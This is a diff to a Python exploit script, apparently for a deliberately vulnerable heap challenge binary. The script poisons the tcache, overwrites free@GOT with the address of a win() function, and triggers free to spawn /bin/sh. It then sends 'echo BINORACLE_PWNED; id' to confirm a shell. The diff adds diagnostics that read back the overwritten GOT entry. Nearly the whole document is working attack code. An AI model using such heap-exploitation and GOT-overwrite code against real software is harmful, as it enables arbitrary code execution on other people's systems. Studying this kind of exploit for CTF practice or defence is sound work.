@@ -89,20 +89,29 @@ try:
     # (puts/write/system/printf) sit right after free@GOT, and win() itself calls printf and
     # system, so zero-padding over them would crash win() before it spawns the shell.
     choose(io, 3, 3, p64(win))                                   # *free@GOT = win (8 bytes only)
+    # DIAG: read chunks[3][:8] back. If it equals win, the arbitrary write DID land on free@GOT
+    # (so any failure is at the free->win jump); if not, the tcache poison did not yield free@GOT.
+    choose(io, 4, 3)
+    wrote = u64(io.recv(8).ljust(8, b"\x00"))
     choose(io, 2, 2)                        # free(valid chunk) -> calls free@GOT -> win() -> /bin/sh
+    post = b""
+    try:
+        post = io.recvrepeat(1.5)           # win()'s "[+] win reached" / a crash / the menu again
+    except Exception:
+        pass
     io.sendline(b"echo BINORACLE_PWNED; id")
-    out = io.recvrepeat(2.0)
+    try:
+        post += io.recvrepeat(1.5)
+    except Exception:
+        pass
     io.close()
-    ok = b"BINORACLE_PWNED" in out or b"win reached" in out or b"uid=" in out
+    ok = b"BINORACLE_PWNED" in post or b"win reached" in post or b"uid=" in post
     if ok:
         print("VERIFIED key=%#x free_got=%#x win=%#x" % (key, free_got, win))
     else:
-        # Diagnostics so we can tell WHY: a glibc abort (e.g. 'unaligned tcache chunk' when
-        # free@GOT is not 16-aligned) vs. a silent no-shell (often x86-64 emulation on Apple
-        # Silicon, where the final jump into never-executed code fails but lands on native x86-64).
-        tail = out[-260:].decode("latin-1", "replace").replace("\n", " | ")
-        print("NOT_VERIFIED key=%#x free_got=%#x win=%#x aligned16=%s tail=%r"
-              % (key, free_got, win, (free_got % 16 == 0), tail))
+        tail = post[-260:].decode("latin-1", "replace").replace("\n", " | ")
+        print("NOT_VERIFIED key=%#x free_got=%#x win=%#x wrote_back=%#x post=%r"
+              % (key, free_got, win, wrote, tail))
 except Exception as e:
     print("ERROR", e)
     sys.exit(1)
